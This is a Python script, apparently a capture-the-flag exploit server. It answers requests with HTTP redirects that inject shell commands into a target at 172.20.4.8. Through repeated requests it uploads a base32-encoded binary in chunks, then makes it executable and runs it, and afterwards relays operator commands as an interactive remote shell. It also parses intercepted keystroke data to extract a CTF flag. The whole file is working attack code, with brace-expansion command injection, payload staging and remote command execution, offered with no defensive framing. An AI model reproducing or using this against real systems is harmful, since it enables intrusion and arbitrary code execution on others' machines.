import os, sys, readline, base64, tempfile, urllib.parse, re, zlib, json
from http.server import HTTPServer, BaseHTTPRequestHandler

filename = tempfile.mktemp()
contents = base64.b32encode(open(sys.argv[1],"rb").read())
MAX_BUFFER = 1000
chunks = [contents[i:i+MAX_BUFFER] for i in range(0, len(contents), MAX_BUFFER)]
chunk_index = 0
start_shell = False
full_charset= "?\n{}ABCDEFGHIJKLMNOPQRSTUVWXYZ"
known = []

def parseKeys(content):
    global known
    keys = []
    current_key = ''
    content = content.decode()
    body = content.splitlines()[3:]
    lines = []
    collect = []
    if len(body):
        for line in body:
            try:
                b64 = base64.b64decode(eval(line))
                deco = zlib.decompress(b64).replace(b'}{',b"}\n{")
                for line2 in deco.splitlines():
                    if b": 1985," in line2:
                        pressed = re.search(r"\[([0-9]+), \1, \1, \1\]", line2.decode())
                        if pressed:
                            key = int(pressed.group(1))
                            if key == 1:
                                if current_key not in known:
                                    keys.append(current_key)
                                    known.append(current_key)
                                current_key = ''
                            current_key += full_charset[key]
            except:
                print("ignoring error")
    return keys

class Redirect(BaseHTTPRequestHandler):
    def do_POST(self):
        global filename, contents, MAX_BUFFER, chunks, chunk_index, start_shell
        try:
            keys = parseKeys(self.rfile.read(int(self.headers.get('Content-Length'))))
            if len(keys) < 10:
                print("received %s attempts"%len(keys))
                for key in keys:
                    print(key)
                    if re.search(r"CTF[{][A-Z]+[}]", key):
                        exit(0)
            else:
                print("received %s attempts, %s-%s"%(len(keys),keys[0],keys[-1]))
        except Exception as e:
            print("error %s"%e)
        self.send_response(302)
        print("req: " + self.path)
        if self.path == '/fdr' and not start_shell:
            if chunk_index < len(chunks):
                chunk = chunks[chunk_index].decode()
                chunk_index += 1
                cmd = "{echo,-n,%s}|{base32,-d}|{tee,-a,%s}" % (chunk, filename)
            else:
                cmd = "{chmod,0777,%s};%s|{tee,-a,%s.out}"%(
                    filename, filename, filename)
                start_shell = True
                print("waiting for flag")
            print("res: " + cmd)
            self.send_header('Location', "http://172.20.4.8:23/;%s;"%(cmd))
        else:
            self.send_header('Location', 'http://172.20.4.8:9980/id')
        self.end_headers()

    def do_GET(self):
        print("req(get): " + self.path)
        self.send_response(302)
        if self.path.startswith('/out/'):
            self.send_header('Location',
                             'http://172.20.4.8:9980/' +
                             urllib.parse.quote(
                                 input('shell: \n' +
                                       urllib.parse.unquote(
                                           self.path
                                       ) + '\n > ')))
        self.end_headers()

print("Waiting for first request..")

HTTPServer(("", 80), Redirect).serve_forever()
